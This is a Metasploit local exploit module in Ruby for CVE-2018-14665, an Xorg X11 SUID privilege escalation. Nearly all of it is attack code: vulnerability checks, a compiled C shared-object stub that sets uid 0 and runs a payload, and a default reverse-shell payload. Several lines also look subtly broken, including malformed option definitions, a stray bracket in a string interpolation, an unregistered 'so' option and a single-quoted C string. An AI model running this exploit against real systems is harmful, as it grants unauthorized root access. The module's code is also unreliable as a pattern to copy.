##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Post::Linux::System


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Xorg X11 Server SUID privilege escalation',
      'Description'    => %q{
        This module attempts to gain root privileges with SUID Xorg X11 server
        versions 1.19.0 < 1.20.3.

        A permission check flaw exists for -modulepath and -logfile options when
        starting Xorg.  This allows unprivileged users that can start the server
        the ability to elevate privileges and run arbitrary code under root
        privileges.

        This module has been tested with OpenBSD 6.3, 6.4, and CentOS 7 (1708).
        CentOS default install will require console auth for the users session.
        Xorg must have SUID permissions and may not start if running.

        On successful exploitation artifacts will be created consistant
        with starting Xorg.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Narendra Shinde', # Discovery and exploit
          'Aaron Ringo',     # Metasploit module
        ],
      'DisclosureDate' => 'Oct 25 2018',
      'References'     =>
        [
           [ 'CVE', '2018-14665' ],
           [ 'BID', '105741' ],
           [ 'EDB', '45697' ],
           [ 'EDB', '45742' ],
           [ 'EDB', '45832' ],
           [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-another-way-of.html' ]
        ],
      'Platform'       =>  %w[openbsd linux],
      'Arch'           =>  [ARCH_CMD, ARCH_X86, ARCH_X64],
      'SessionTypes'   =>  %w[shell meterpreter],
      'Targets'        =>
        [
           ['OpenBSD', {
            'Platform' => 'unix',
            'Arch' => [ ARCH_CMD ] } ],
           ['Linux x64', {
            'Platform' => 'linux',
            'Arch' => [ ARCH_X64 ] } ],
           ['Linux x86', {
            'Platform' => 'linux',
            'Arch' => [ ARCH_X86 ] } ]
        ],
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'cmd/unix/reverse_openssl',
          'WfsDelay' => 120
        },
      'DefaultTarget'  => 0))

     register_advanced_options(
       [
         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
         OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ]),
         OptBool.new('ConsoleLock', [ true, 'Will check for console lock under linux', true ]),
         OptString.new('Xdisplay', [ true, 'shared object to load ', libglx.so
       ]
     )
  end


  def check

    # linux checks
    uname = cmd_exec "uname"
    if uname =~ /linux/i
      vprint_status "Running additional check for Linux"
      if datastore['ConsoleLock']
        user = cmd_exec "id -un"
        unless exist? "/var/run/console/#{user}"
          vprint_error "No console lock for #{user}"
          return CheckCode::Safe
        end
        vprint_good "Console lock for #{user}"
      end
    end

    # suid program check
    xorg_path = cmd_exec "command -v Xorg"
    unless xorg_path.include?("Xorg")
      vprint_error "Could not find Xorg executable"
      return CheckCode::Safe
    end
    vprint_good "Xorg path found at #{xorg_path}"
    unless setuid? xorg_path
      vprint_error "Xorg binary #{xorg_path} is not SUID"
      return CheckCode::Safe
    end
    vprint_good "Xorg binary #{xorg_path} is SUID"

    # version check
    x_version = cmd_exec "Xorg -version"
    if x_version.include?("Release Date")
      v = Gem::Version.new(x_version.scan(/\d\.\d+\.\d+/).first)
      unless v.between?(Gem::Version.new('1.19.0'), Gem::Version.new('1.20.2'))
        vprint_error "Xorg version #{v} not supported"
        return CheckCode::Safe
      end
    elsif x_version.include?("Fatal server error")
      vprint_error "User probably does not have console auth"
      vprint_error "Below is Xorg -version output"
      vprint_error x_version
      return CheckCode::Safe
    else
      vprint_warning "Could not parse Xorg -version output"
      return CheckCode::Appears
    end
    vprint_good "Xorg version #{v} is vulnerable"

    # process check for /X
    proc_list = cmd_exec "ps ax"
    if proc_list.include?('/X ')
      vprint_warning('Xorg in process list')
      return CheckCode::Appears
    end
    vprint_good('Xorg does not appear running')
    return CheckCode::Vulnerable
  end


  def exploit

    check_status = check
    if check_status == CheckCode::Appears
      print_warning 'Could not get version or Xorg process possibly running, may fail'
    elsif check_status ==  CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target not vulnerable'
    end

    unless has_gcc?
      vprint_error 'gcc is not installed'
      return CheckCode::Safe
    end
    vprint_good 'gcc is installed'

    if is_root?
      fail_with Failure::BadConfig, 'This session already has root privileges'
    end

    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end

    print_good 'Passed all initial checks for exploit'

    modulepath = datastore['WritableDir']
    launcher = "#{modulepath]}/#{rand_text_alphanumeric 5..10}.c"
    pscript = "#{modulepath}/.session-#{rand_text_alphanumeric 5..10}"
    xdisplay = datastore['Xdisplay']
    so = "#{modulepath}/#{datastore['so']}"

    stub = %Q^
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    setgid(0);
    setuid(0);
    system('#{pscript}');
  }
    ^
    print_status 'Writing launcher'
    write_file(launcher, stub)

    print_status 'compiling launcher'
    output = cmd_exec "gcc -fPIC -shared -o #{so} #{launcher} -nostartfiles"
    chmod so

    # Uploading
    print_status 'Uploading your payload, this could take a while'
    if payload.arch.first == 'cmd'
      write_file(pscript, payload.encoded)
    else
      write_file(pscript, generate_payload_exe)
    end
    register_file_for_cleanup pscript
    chmod pscript

    # Actual exploit with cron overwrite
    print_status 'Exploiting'
    #Xorg -logfile derp -modulepath ',/tmp' :1
    cmd_exec "Xorg -modulepath ',#{modulepath}' #{xdisplay} & >/dev/null"
    Rex.sleep 5
    cmd_exec "pkill Xorg"
    Rex.sleep 1
  end
end
